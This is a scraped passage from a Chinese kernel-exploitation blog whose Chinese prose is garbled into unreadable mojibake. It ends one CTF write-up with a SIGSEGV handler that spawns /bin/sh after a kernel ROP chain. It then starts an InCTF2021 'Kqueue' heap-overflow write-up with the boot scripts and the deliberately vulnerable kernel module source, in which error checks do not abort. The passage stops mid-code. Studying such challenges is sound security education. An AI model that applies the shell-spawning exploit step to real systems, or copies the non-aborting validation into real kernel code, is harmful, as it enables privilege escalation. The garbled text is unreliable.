<p>å®˜è§£åœ¨å¸ƒç½®ropçš„æ—¶å€™æ²¡æœ‰é‡æ–°è®¾ç½®<code>cr3</code>çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰æ›´æ¢é¡µè¡¨ï¼Œæ‰€ä»¥æœ€åè¿”å›ç”¨æˆ·æ€ä¹‹åæ‰§è¡ŒæŒ‡ä»¤è‚¯å®šä¼šçˆ†æ®µé”™è¯¯ï¼Œå®˜è§£æ˜¯è¿™æ ·å¤„ç†çš„,ä»–è®¾ç½®äº†æ®µé”™è¯¯çš„å¤„ç†å‡½æ•°ï¼Œè¿™æ ·åœ¨å‘ç”Ÿäº†æ®µé”™è¯¯ä»¥åï¼Œé‡æ–°é™·å…¥å†…æ ¸æ€ï¼Œç„¶åå†…æ ¸æ€è‡ªåŠ¨åˆ‡æ¢åˆ°ç”¨æˆ·æ€ç„¶åæ‰§è¡Œå¤„ç†å‡½æ•°<code>spawn_shell</code>ï¼Œè¿™æ ·å°±å¯ä»¥ä¸ç”¨æˆ‘ä»¬å¸ƒç½®ä½†æ˜¯å®Œç¾çš„è¿”å›åˆ°äº†ç”¨æˆ·æ€å¹¶æ‰§è¡Œç”¨æˆ·æ€æŒ‡ä»¤äº†ã€‚</p>
<p>ä½†æ˜¯ç›´æ¥å¸ƒç½®<code>swapgs_restore_regs_and_return_to_usermode</code>ä½¿ç”¨çš„å†…å­˜å…¶å®å·®ä¸å¤šçš„ï¼Œå˜¿å˜¿ï¼Œå¯ä»¥ç”¨ä½†æ˜¯æ²¡å¿…è¦ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">signal(SIGSEGV, spawn_shell);</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é€šè¿‡è¿™é“é¢˜ä¹Ÿæ˜¯å­¦åˆ°äº†å¾ˆå¤šï¼Œæ›´åŠ ç†Ÿæ‚‰ç”¨æˆ·æ€é¡µè¡¨å’Œå†…æ ¸æ€é¡µè¡¨çš„éš”ç¦»æœºåˆ¶äº†ï¼Œæ¯”å¦‚å¼€äº†kptiä½†æ˜¯ä¸å¼€smepåœ¨å†…æ ¸æ€æ—¶å…¶å®å’Œå¼€äº†æ²¡æœ‰å·®åˆ«ï¼Œä½†æ˜¯å¼€äº†kptiå¼€ä¸å¼€smapå·®åˆ«è¿˜æ˜¯æŒºå¤§çš„ã€‚</p>
<p>ç„¶åæ˜¯å¯¹<code>swapgs_restore_regs_and_return_to_usermode</code>çš„ç†è§£ï¼Œåœ¨å­¦ä¹ <code>ret2dir</code>çš„æ—¶å€™æˆ‘ä¸ç†è§£ä¸ºä»€ä¹ˆäº¤æ¢äº†é¡µè¡¨ä¹‹åè¿˜æ˜¯å¯ä»¥ç»§ç»­æ‰§è¡Œ<code>swapgs_restore_regs_and_return_to_usermode</code>,é€šè¿‡<code>mit6.s081</code>çš„å­¦ä¹ ï¼Œèƒ½è¿™æ ·åšçš„å”¯ä¸€è§£æ³•å°±æ˜¯è¿™ä¸ªå‡½æ•°åœ¨ç”¨æˆ·æ€å’Œå†…æ ¸æ€éƒ½è¿›è¡Œäº†æ˜ å°„ï¼Œç„¶åæ˜ å°„çš„è™šæ‹Ÿåœ°å€æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œä¹Ÿä½è¯äº†ç”¨æˆ·æ€é¡µè¡¨æ˜ å°„äº†å°‘é‡çš„å†…æ ¸æ€åœ°å€ã€‚</p>
<p>è¿™é“é¢˜åœ¨çˆ†ç ´åˆ°å†…æ ¸åœ°å€åå°±æ˜¯æ¯”è¾ƒç®€å•äº†ï¼ŒåŸå› æ˜¯æ²¡æœ‰å¼€<code>pt_regs</code>çš„åç§»å’Œ<code>smap</code>,å‡å¦‚è¿™ä¸¤ä¸ªéƒ½å¼€äº†çš„è¯ï¼Œç›®å‰æˆ‘èƒ½æƒ³åˆ°çš„è§£æ³•å°±æ˜¯åˆ©ç”¨<code>ret2dir</code>è¿›è¡Œropäº†ï¼Œè¿™æ ·ä¼šæ¯”è¾ƒéº»çƒ¦ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/26/kernelpwn-%E5%86%8D%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/26/kernelpwn-%E5%86%8D%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">kernelpwn å†å…¥é—¨</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-07-26 17:58:24" itemprop="dateCreated datePublished" datetime="2022-07-26T17:58:24+08:00">2022-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-07-29 23:29:51" itemprop="dateModified" datetime="2022-07-29T23:29:51+08:00">2022-07-29</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ä¹‹å‰å­¦ä¹ è¿‡ä¸€ä¼škernelpwn,ä½†æ„Ÿè§‰å­¦ä¹ çš„ä¸æ˜¯å¾ˆæ·±å…¥å¾ˆæ‰å®ï¼Œå¯¼è‡´ç°åœ¨å¥½å¤šä¸œè¥¿ä¹Ÿéƒ½å¿˜äº†ï¼Œé‚£å°±å†å…¥é—¨ä¸€æ¬¡å§ã€‚</p>
<h2 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap-overflow"></a>heap-overflow</h2><p>å°±åƒç”¨æˆ·æ€çš„å †æº¢å‡ºå¯ä»¥è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼ŒåŒæ ·çš„å†…æ ¸æ€çš„ä¸Šå †æº¢å‡ºä¹Ÿå¯ä»¥è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œå†…æ ¸æ€çš„å †æ˜¯é€šè¿‡slub/slabè¿›è¡Œç®¡ç†çš„ï¼Œä»–æŠŠç©ºé—²é˜Ÿåˆ—ä»¥é“¾è¡¨çš„å½¢å¼ç»„ç»‡ï¼Œæ‰€ä»¥åœ¨æˆ‘ç°åœ¨è®¤ä¸ºå †æº¢å‡ºä¸€å…±æœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡æº¢å‡ºè¦†ç›–ä¸‹ä¸€ä¸ªå †çš„nextæ¥è¾¾åˆ°ä»»æ„åœ°å€ç”³è¯·ï¼Œå¦ä¸€ç§æ˜¯<code>heap spray</code>,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å†…æ ¸æœ¬èº«çš„ä¸€äº›ç»“æ„ä½“ï¼Œè¿™äº›ç»“æ„ä½“é‡Œæœ‰å‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡æº¢å‡ºå¯ä»¥è¦†ç›–åˆ°å‡½æ•°æŒ‡é’ˆï¼Œè¿›è€Œè¿›è¡Œripçš„åŠ«æŒã€‚</p>
<h3 id="ä¾‹é¢˜ï¼šInCTF2021-Kqueue"><a href="#ä¾‹é¢˜ï¼šInCTF2021-Kqueue" class="headerlink" title="ä¾‹é¢˜ï¼šInCTF2021 - Kqueue"></a>ä¾‹é¢˜ï¼šInCTF2021 - Kqueue</h3><p><strong>å¯åŠ¨è„šæœ¬</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-cpu kvm64 \</span><br><span class="line">-m 512 \</span><br><span class="line">-nographic \</span><br><span class="line">-kernel  ./bzImage \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-net user \</span><br><span class="line">-net nic</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è„šæœ¬å¯çŸ¥cpuä½¿ç”¨äº†kvmè¿›è¡Œè™šæ‹Ÿï¼Œè™šæ‹Ÿæœºå¼€äº†kaslr,æ²¡å¼€kpti</p>
<p><strong>æ–‡ä»¶ç³»ç»Ÿå¯åŠ¨è„šæœ¬</strong></p>
<p>ç”±äºé¢˜ç›®çš„æ–‡ä»¶ç³»ç»Ÿç”±buildrootæ„å»ºï¼Œæˆ‘ä¸æ˜¯å¾ˆæ‡‚ï¼Œæ‰€ä»¥æ¢äº†ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä¸å½±å“åšé¢˜ï¼Œå°±æ˜¯åŠ è½½å®Œè‡ªå†™å†…æ ¸æ¨¡å—ç„¶åè®¾ç½®æƒé™ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;IF8gIF9fICAgICAgICAgICAgICAgXyAgICAgICAgICBfICAgICAKfCB8LyAvX19fICBfX18gXyBfXyB8IHwgICAgX18gX3wgfF9fICAKfCAnIC8vIF8gXC8gXyBcICdfIFx8IHwgICAvIF9gIHwgJ18gXCAKfCAuIFwgIF9fLyAgX18vIHwgfCB8IHxfX3wgKF98IHwgfF8pIHwKfF98XF9cX19ffFxfX198X3wgfF98X19fX19cX18sX3xfLl9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK&quot;</span> | base64 -d</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/baby.ko</span><br><span class="line">chmod 644 /dev/kqueue</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">cd</span> /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p><strong>å†…æ ¸æ¨¡å—</strong></p>
<p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼Œå¯ä»¥ç›´æ¥é˜…è¯»æºç ï¼Œé€šè¿‡é˜…è¯»æºç å¯ä»¥é€†å‡ºè¿™ä¸ªkoæ¨¡å—åœ¨å†…æ ¸å®ç°äº†ä¸€ç§é˜Ÿåˆ—ç®¡ç†ï¼ˆç§ä»¥ä¸ºä¸æ˜¯å¾ˆå†™çš„ä¸æ˜¯å¾ˆé«˜æ•ˆï¼‰ï¼Œè¿™æ˜¯<code>ioctl()</code>å‡½æ•°æºç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">kqueue_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">request_t</span> request;</span><br><span class="line">    </span><br><span class="line">    mutex_lock(&amp;operations_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user((<span class="keyword">void</span> *)&amp;request, (<span class="keyword">void</span> *)arg, <span class="keyword">sizeof</span>(<span class="keyword">request_t</span>)))&#123;</span><br><span class="line">        err(<span class="string">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> CREATE_KQUEUE:</span><br><span class="line">            result = create_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DELETE_KQUEUE:</span><br><span class="line">            result = delete_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EDIT_KQUEUE:</span><br><span class="line">            result = edit_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SAVE:</span><br><span class="line">            result = save_kqueue_entries(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            result = INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ret: </span><br><span class="line">    mutex_unlock(&amp;operations_lock);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥ä¸åŒçš„cmdæ‰§è¡Œä¸åŒçš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°çœ‹åˆ°å‡½æ•°åå°±èƒ½çŸ¥é“æ˜¯å¹²å•¥çš„ï¼Œéå¸¸å¥‡æ€ªçš„æ˜¯ä»–ä¼šå¯¹ä¼ å…¥çš„<code>request</code>ç»“æ„ä½“è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœä¸ç¬¦åˆè¦æ±‚å°±ä¼šæ‰§è¡Œ<code>err</code>å‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ä¸ä¼šexit()ï¼Œæ‰€ä»¥æ£€æŸ¥ç›¸å½“äºæ²¡æ£€æŸ¥.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">err</span><span class="params">(<span class="keyword">char</span>* msg)</span></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;%s\n&quot;</span>,msg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„å°±æ˜¯<code>create_kqueue()</code>å‡½æ•°å’Œ<code>save_kqueue_entries()</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">create_kqueue</span><span class="params">(<span class="keyword">request_t</span> request)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> result = INVALID;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(queueCount &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Max queue count reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries&lt;<span class="number">1</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Asking for too much is also not good */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize kqueue_entry structure */</span></span><br><span class="line">    queue_entry *kqueue_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class="line">    ull space = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_umulll_overflow(<span class="keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="number">1</span>),&amp;space) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class="line">    ull queue_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_saddll_overflow(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>),space,&amp;queue_size) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Total size should not exceed a certain limit */</span></span><br><span class="line">    <span class="keyword">if</span>(queue_size&gt;<span class="keyword">sizeof</span>(<span class="built_in">queue</span>) + <span class="number">0x10000</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All checks done , now call kzalloc */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate((<span class="keyword">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Main queue can also store data */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data = validate((<span class="keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill the remaining queue structure */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data_size   = request.data_size;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;queue_size  = queue_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the place from where memory has to be handled */</span></span><br><span class="line">    kqueue_entry = (queue_entry *)((<span class="keyword">uint64_t</span>)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate all kqueue entries */</span></span><br><span class="line">    queue_entry* current_entry = kqueue_entry;</span><br><span class="line">    queue_entry* prev_entry = current_entry;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=request.max_entries)</span><br><span class="line">            prev_entry-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        current_entry-&gt;idx = i;</span><br><span class="line">        current_entry-&gt;data = (<span class="keyword">char</span> *)(validate((<span class="keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Increment current_entry by size of queue_entry */</span></span><br><span class="line">        current_entry += <span class="keyword">sizeof</span>(queue_entry)/<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Populate next pointer of the previous entry */</span></span><br><span class="line">        prev_entry-&gt;next = current_entry;</span><br><span class="line">        prev_entry = prev_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Find an appropriate slot in kqueues */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kqueues[j] == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(j&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class="line">    kqueues[j] = <span class="built_in">queue</span>;</span><br><span class="line">    queueCount++;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">delete_kqueue</span><span class="params">(<span class="keyword">request_t</span> request)</span></span>&#123;</span><br><span class="line">    <span class="comment">/* Check for out of bounds requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for existence of the request kqueue */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    kfree(<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">queue</span>,<span class="number">0</span>,<span class="built_in">queue</span>-&gt;queue_size);</span><br><span class="line">    kqueues[request.queue_idx] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now you have the option to safely preserve your precious kqueues */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">save_kqueue_entries</span><span class="params">(<span class="keyword">request_t</span> request)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for out of bounds queue_idx requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if queue is already saved or not */</span></span><br><span class="line">    <span class="keyword">if</span>(isSaved[request.queue_idx]==<span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Queue already saved&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate(kqueues[request.queue_idx]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries &lt; <span class="number">1</span> || request.max_entries &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate memory for the kqueue to be saved */</span></span><br><span class="line">    <span class="keyword">char</span> *new_queue = validate((<span class="keyword">char</span> *)kzalloc(<span class="built_in">queue</span>-&gt;queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Each saved entry can have its own size */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size &gt; <span class="built_in">queue</span>-&gt;queue_size)</span><br><span class="line">        err(<span class="string">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(new_queue,<span class="built_in">queue</span>-&gt;data,request.data_size));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">    new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the entries of the kqueue */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span 